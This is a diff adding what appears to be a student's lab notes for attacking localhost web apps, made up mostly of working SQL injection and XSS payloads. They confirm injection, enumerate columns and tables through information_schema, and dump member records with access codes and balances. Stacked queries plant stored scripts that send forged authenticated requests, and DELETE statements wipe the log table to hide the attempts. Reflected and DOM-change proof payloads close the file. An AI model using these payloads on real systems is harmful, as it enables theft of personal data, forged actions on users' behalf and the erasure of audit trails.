@@ -1,0 +1,304 @@
+injection confirmation:
+
+a' or '1'='1 --> PIN
+
+
+how many columns:
+
+a' or '1'='1' order by 1 limit 1 # 
+--> order by first column
+
+a' or '1'='1' order by 5 limit 1 # 
+--> returns null ; so 1,2,3,4 no. column
+
+
+which columns are being shown:
+
+' union select 1,2,3,4 # 
+--> 2,3,4 ; 2,3,4 no. columns are shown
+
+' union select 12,DATABASE(),14,15 # 
+--> <schema_name> 14, 15 ; 2nd column is schema name
+
+' union select 12,VERSION(),14,15 # 
+--> <version> 14, 15 ; 2nd column is database version
+
+' union select '',database(),'','' # 
+--> <schema_name>
+
+table_name and column_name discovery:
+
+' union select '', group_concat(table_name),'', '' from information_schema.tables 
+where table_schema=database() #
+--> shows all table_names under the database.
+
+
+' union select '', group_concat(column_name), '', '' from information_schema.columns 
+where table_name='<table_name>' #
+--> shows all column_names under the database.
+
+extraction:
+
+' UNION SELECT '', 
+GROUP_CONCAT(
+    id, ' ', 
+    fname, ' ', 
+    lname, ' ', 
+    total_amount, ' ', 
+    '<br>'
+), 
+'', '' 
+FROM (
+    SELECT 
+        m.member_id AS id, 
+        m.first_name AS fname, 
+        m.last_name AS lname, 
+        COALESCE(SUM(f.amount), 0) AS total_amount
+    FROM member m 
+    LEFT JOIN fine_record f ON m.member_id = f.member_id AND f.status = 'UNPAID' 
+    GROUP BY m.member_id
+) AS temp_table 
+
+where id >= 4100015 # 
+
+
+await fetch("http://localhost:4001/list", {
+    "credentials": "include",
+    "headers": {
+        
+        "Content-Type": "application/x-www-form-urlencoded",
+
+    },
+    "referrer": "http://localhost:4001/",
+    "body": "title=book&price=40",
+    "method": "POST",
+    "mode": "cors"
+});
+
+rahman-41' ; update member set last_name = concat('
+    <script>
+    fetch("http://localhost:4001/list", {
+    "credentials": "include",
+    "headers": {
+        
+        "Content-Type": "application/x-www-form-urlencoded",
+
+    },
+    "referrer": "http://localhost:4001/",
+    "body": "title=book&price='
+    , (SELECT SUM(amount) FROM fine_record WHERE member_id = 4100001 AND status = 'UNPAID'),
+    '",
+    "method": "POST",
+    "mode": "cors"
+    });
+    </script>')
+
+    where member_id = 4100001 #
+
+rahman-41'; DELETE FROM log WHERE submitted_id = 4100001 #
+
+
+
+B1---------------------------------------------------------------------------------------------------------------------->
+
+
+a' or '1'='1' order by 5 limit 1 # 
+
+' union select 1,2,3,4,5 
+# --> 3,4,5
+
+
+' union select '','', group_concat(table_name),'', '' from information_schema.tables
+ where table_schema=database() #
+--> log,membership
+
+
+' union select '','', group_concat(column_name), '', '' 
+from information_schema.columns where table_name='membership' #
+--> shows all column_names under the database.
+
+log -> attempted_at,id,submitted_id,submitted_secret
+membership -> access_code,credits_remaining,first_name,id,last_name
+
+' UNION SELECT '', '',
+GROUP_CONCAT(
+    id, ' ', 
+    first_name, ' ', 
+    last_name, ' ', 
+    access_code, ' ', 
+    credits_remaining, ' ', 
+    '<br>'
+), 
+'', '' 
+FROM membership #
+
+
+
+
+await fetch("http://localhost:5001/reply", {
+    "credentials": "include",
+    "headers": {
+        
+        "Content-Type": "application/x-www-form-urlencoded",
+        
+    },
+    "referrer": "http://localhost:5001/",
+    "body": "message=hello",
+    "method": "POST",
+    "mode": "cors"
+});
+
+
+fit-Nabila-17' ; update membership set last_name = concat('
+    <script>
+    fetch("http://localhost:5001/reply", {
+    "credentials": "include",
+    "headers": {
+        
+        "Content-Type": "application/x-www-form-urlencoded",
+
+    },
+    "referrer": "http://localhost:5001/",
+    "body":"message=helloo rafi",
+    "method": "POST",
+    "mode": "cors"
+    });
+    </script>')
+
+    where id= 7700002
+    #
+
+
+const payload = '<script>document.title="B1-REFLECTED-XSS"</script>';
+const link = "http://localhost:5001/search?q=" + encodeURIComponent(payload);
+
+const message = link;                 
+
+const body = "message=" + encodeURIComponent(message);
+console.log(body);   // ← copy this exact string for your SQL payload
+fetch("http://localhost:5001/reply", {
+  method: "POST",
+  credentials: "include",
+  headers: { "content-type": "application/x-www-form-urlencoded" },
+  body: body
+});
+
+
+'; delete from log where submitted_id=7700001 #
+
+
+C1----------------------------------------------------------------------------------------------------------------------->
+
+a' or '1'='1' order by 5 limit 1 #
+
+' union select 1,2,3,4,5 # 
+--> 3,4,5
+
+' union select '','', group_concat(table_name),'', '' from information_schema.tables
+ where table_schema=database() #
+
+ --> log, registration
+
+ ' union select '','', group_concat(column_name), '', '' 
+from information_schema.columns where table_name='log' #
+
+--> registration --> balance_due,first_name,last_name,reg_pin,student_id
+--> log          --> attempted_at,id,submitted_id,submitted_secret
+
+' UNION SELECT '', '',
+GROUP_CONCAT(
+    student_id, ' ', 
+    first_name, ' ', 
+    last_name, ' ',  
+    balance_due, ' ', 
+    '<br>'
+), 
+'', '' 
+FROM registration #
+
+await fetch("http://localhost:3001/send", {
+    "credentials": "include",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "referrer": "http://localhost:3001/",
+    "body": "message=hello",
+    "method": "POST",
+    "mode": "cors"
+});
+
+<b> kkk </b>
+
+
+const link = '<script>document.title="C1-SECOND-ORDER-XSS"</script>';
+const message = link;
+const body = "message=" + encodeURIComponent(message);
+console.log(body);   // ← copy this exact string for your SQL payload
+
+
+message=%3Cscript%3Edocument.title=%22C1-SECOND-ORDER-XSS%22%3C/script%3E
+
+reg-isha-29';
+update registration set last_name = 
+concat(
+    '<script>
+        fetch("http://localhost:3001/send", 
+            {
+                "credentials": "include",
+                "headers": {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                },
+                "body": "message=%3Cscript%3Edocument.title=%22C1-SECOND-ORDER-XSS%22%3C/script%3E",
+                "method": "POST",
+            }
+        );
+    </script>'
+) where student_id = 9900001 #
+
+
+// 1. Change the browser tab's page title.
+// document.title represents the current HTML document's <title>.
+// After execution, the browser tab will show "XSS-TEST".
+const payload = '<script>document.title="XSS-TEST"</script>';
+
+
+// 2. Same idea, but using a different marker.
+// Useful in a lab because you can immediately recognize that
+// your injected JavaScript was executed.
+const payload = '<script>document.title="B1-SUCCESS"</script>';
+
+
+// 3. Insert visible text at the beginning of the page body.
+// document.body represents the page's <body>.
+// insertAdjacentText("afterbegin", ...) inserts plain text
+// immediately after the opening <body> tag.
+// The page will therefore display "XSS EXECUTED" near the top.
+const payload = '<script>document.body.insertAdjacentText("afterbegin","XSS EXECUTED")</script>';
+
+
+// 4. Find the first <h1> element and replace its text.
+// document.querySelector("h1") finds the first matching <h1>.
+// .textContent changes the text inside that element.
+// This requires the target page to actually contain an <h1>.
+const payload = '<script>document.querySelector("h1").textContent="XSS TEST"</script>';
+
+
+// 5. Change the background of the page.
+// document.body.style accesses the CSS styles of the <body>.
+// Setting background to "black" makes the page background black.
+// This is another visual proof that JavaScript executed.
+const payload = '<script>document.body.style.background="black"</script>';
+
+
+// 6. Perform two harmless DOM changes.
+// First: change the browser tab title to "XSS".
+// Second: insert "EXECUTED" at the beginning of the page.
+// The semicolon separates the two JavaScript statements.
+const payload = '<script>document.title="XSS";document.body.insertAdjacentText("afterbegin","EXECUTED")</script>';
+
+
+// 7. Display a JavaScript alert.
+// alert() opens a browser dialog containing "XSS-TEST".
+// This is a very obvious proof of JavaScript execution,
+// although a title/DOM change is often less disruptive for a lab.
+const payload = '<script>alert("XSS-TEST")</script>';
